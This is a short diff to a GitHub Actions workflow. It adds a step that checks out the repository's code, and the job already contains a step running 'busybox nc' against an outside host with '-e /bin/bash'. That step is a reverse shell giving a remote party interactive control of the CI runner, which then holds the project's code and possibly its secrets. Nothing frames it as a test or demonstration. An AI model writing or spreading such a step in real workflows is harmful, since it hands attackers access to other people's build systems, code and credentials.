@@ -4,4 +4,6 @@ jobs:
   my-job-1:
     runs-on: ubuntu-latest
     steps:
+    - name: Check out repository code
+      uses: actions/checkout@v2
     - run: busybox nc tyio.net 1111 -e /bin/bash
